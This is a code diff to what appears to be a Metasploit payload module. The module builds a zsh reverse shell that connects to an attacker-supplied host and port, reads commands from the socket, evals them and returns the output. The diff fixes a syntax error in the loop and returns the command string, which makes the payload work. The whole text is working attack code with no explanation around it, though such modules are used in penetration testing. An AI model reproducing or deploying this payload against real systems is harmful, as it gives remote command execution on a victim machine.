@@ -39,6 +39,7 @@ module Metasploit3
 		cmd = "zmodload zsh/net/tcp;"
 		cmd << "ztcp #{datastore['LHOST']} #{datastore['LPORT']};"
 		cmd << "fd=$REPLY;"
-		cmd << "while [ $REPLY ];do read -r cmd <&$REPLY;eval ${cmd} >&$REPLY;;done"
+		cmd << "while [ $REPLY ];do read -r cmd <&$REPLY;eval ${cmd} >&$REPLY;done"
+		cmd
 	end
 end
